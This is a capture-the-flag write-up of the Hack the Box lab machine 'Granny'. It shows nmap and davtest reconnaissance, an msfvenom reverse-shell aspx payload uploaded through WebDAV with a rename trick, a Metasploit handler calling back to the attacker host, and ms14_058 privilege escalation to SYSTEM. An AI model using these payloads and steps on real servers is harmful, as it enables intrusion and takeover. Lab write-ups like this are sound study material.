---
Tags: webdav, metasploit, windows, aspx
---

# Hack the Box - Granny

This was an older Windows box that involved uploading a webshell with webdav and a little trick to get it working. Once we had a foothold with the webshell we used metasploit's exploit suggester module to elevate to SYSTEM and get the user and root flag.

## Information Gathering

### Nmap

```
nmap -sC -sV -oA tcp_Scan 10.10.10.15

Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-22 13:54 EST
Nmap scan report for 10.10.10.15
Host is up (0.036s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Sat, 22 Feb 2020 18:55:19 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

### Davtest

The webdav discovery gives us an excuse to use davtest to figure out what we can put on the server.

```
davtest -url http://10.10.10.15/

********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: ESckDj23HMIVh0
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_ESckDj23HMIVh0
********************************************************
 Sending test files
PUT	asp	FAIL
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.jsp
PUT	shtml	FAIL
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.pl
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.html
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.cfm
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.php
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.txt
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.jhtml
PUT	cgi	FAIL
PUT	aspx	FAIL
********************************************************
 Checking for test file execution
EXEC	jsp	FAIL
EXEC	pl	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.html
EXEC	cfm	FAIL
EXEC	php	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.txt
EXEC	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.jsp
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.pl
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.html
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.cfm
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.php
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.txt
PUT File: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.jhtml
Executes: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.html
Executes: http://10.10.10.15/DavTestDir_ESckDj23HMIVh0/davtest_ESckDj23HMIVh0.txt

```

## Exploitation

With this information we can generate a payload and upload with webdav. The only catch is we'll have to upload it with a txt extension and rename it later.

### Generating a Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.54 LPORT=4445 -f aspx > shell.aspx
```

### Upload and Rename

Upload:
```
curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx 
```

Move:
```
curl -X MOVE -H 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
```

### Foothold

Start metasploit:
```
msfdb run
use exploit/multi/handler
set lhost tun0
set lport 4445
run
```

Navigate to `http://10.10.10.15/shell/aspx`

Once we get our meterpreter session we'll still need to elevate our privileges to read the user flag.

```
use exploit/post/multi/recon/local_exploit_suggester
set session 1
run
```

We'll get a few exploits back but the one that worked for us this time was `windows/local/ms14_058_track_popup_menu`

```
use windows/local/ms14_058_track_popup_menu
set session 1
run

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

### User Flag

```
meterpreter > ls
Listing: c:\Documents and Settings\Lakis\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 15:19:57 -0400  user.txt

meterpreter > cat user.txt
700c5dc163014e22b3e408f8703f67d1meterpreter >
```

### Root Flag

```
meterpreter > ls
Listing: c:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 10:28:50 -0400  root.txt

meterpreter > cat root.txt
aa4beed1c0584445ab463a6747bd06e9meterpreter > 
```

## Resources/References
* https://code.blogs.iiidefix.net/posts/webdav-with-curl/
* https://linux.die.net/man/1/cadaver